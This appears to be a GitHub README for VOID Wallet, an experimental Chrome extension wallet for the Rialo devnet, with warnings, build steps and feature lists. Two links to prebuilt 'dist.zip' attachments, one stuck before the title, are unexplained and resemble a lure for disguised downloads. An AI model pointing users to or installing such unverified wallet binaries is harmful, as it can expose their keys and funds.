[dist.zip](https://github.com/user-attachments/files/24811149/dist.zip)# VOID Wallet

A secure browser extension wallet for the Rialo blockchain.



**DEVNET ONLY. DEVNET ONLY. DEVNET ONLY.**

> **CRITICAL WARNING**
>
> 🛑 **THIS WALLET IS EXCLUSIVELY FOR THE RIALO DEVNET.**
>
> - **DO NOT USE ON MAINNET.**
> - **DO NOT SEND REAL FUNDS.**
> - **YOU WILL LOSE YOUR FUNDS IF YOU USE THIS ON MAINNET.**
>
> This is EXPERIMENTAL software for testing purposes only.

> **Note**  
> VOID is in active development. APIs are subject to change.  
> This code is unaudited. **USE AT YOUR OWN RISK.**

## Important

This wallet is designed exclusively for **Rialo Devnet** testing purposes:

- Network: `https://devnet.rialo.io:4101`
- Tokens: RIALO (testnet only, no monetary value)
- Purpose: Development and testing only

**Mainnet support is NOT available and NOT planned for this build.**

## Table of Contents

- [Installing the Latest Release](#installing-the-latest-release)
- [Developing Locally](#developing-locally)
- [Building for Production](#building-for-production)
- [Installing the Extension](#installing-the-extension)
- [Features](#features)
- [Tech Stack](#tech-stack)
- [Project Structure](#project-structure)
- [License](#license)

## Installing the Latest Release

Grab the latest [dist.zip](https://github.com/user-attachments/files/24811151/dist.zip)


## Developing Locally

### Pull the code

```bash
git clone https://github.com/YOUR_USERNAME/void-wallet.git
cd void-wallet
```

### Install dependencies

```bash
npm install
```

### Start development server

```bash
npm run dev
```

## Building for Production

```bash
npm run build
```

The built extension will be in the `dist/` directory.

## Installing the Extension

1. Go to `chrome://extensions`
2. Enable **Developer mode** (top right toggle)
3. Click **Load unpacked**
4. Select the `dist/` directory

## Features

- Secure key management with encrypted storage
- Password-protected wallet access
- Send and receive RIALO tokens (DEVNET ONLY)
- Transaction history
- dApp integration via Wallet Standard
- Transaction simulation before signing
- CPI (Cross-Program Invocation) risk detection

## Demo

https://github.com/user-attachments/assets/b918dda0-167f-4f93-bc2e-bab72dc6213a



## Tech Stack

| Category | Technology |
|----------|------------|
| UI | React 19 |
| Language | TypeScript |
| Build | Vite 7 |
| Styling | Tailwind CSS |
| Blockchain | @solana/web3.js |
| Extension | Chrome Manifest V3 |

## Project Structure

```
src/
├── background/     # Service worker and wallet logic
├── content/        # Content scripts for dApp injection
├── inject/         # Injected provider for web pages
├── shared/         # Shared types, utilities, and crypto
└── ui/             # React UI components
    ├── popup/      # Main wallet popup
    └── components/ # Reusable UI components
```

## References

- **Rialo CDK Docs**: [docs.rs/rialo-cdk](https://docs.rs/rialo-cdk/latest/src/rialo_cdk/lib.rs.html#4-97)
- **Rialo Devnet**: `https://devnet.rialo.io:4101`
- **Wallet Standard**: [wallet-standard](https://github.com/wallet-standard/wallet-standard)

## Security

- All private keys are encrypted with AES-GCM




- Keys never leave the extension context
- Transaction simulation before signing
- Risk assessment for unknown programs

## Disclaimer

**This software is provided "AS IS", without warranty of any kind.**

- **No support or maintenance provided.**
- No mainnet support.
- No real token support.
- Use at your own risk.

The developers are not responsible for any loss of funds or damages. This is a purely experimental build for educational and testing purposes on the Rialo Devnet.

## License

MIT License - see [LICENSE](./LICENSE)

---

Unless you explicitly state otherwise, any contribution intentionally submitted for inclusion by you shall be licensed at the discretion of the repository maintainers without any additional terms or conditions.
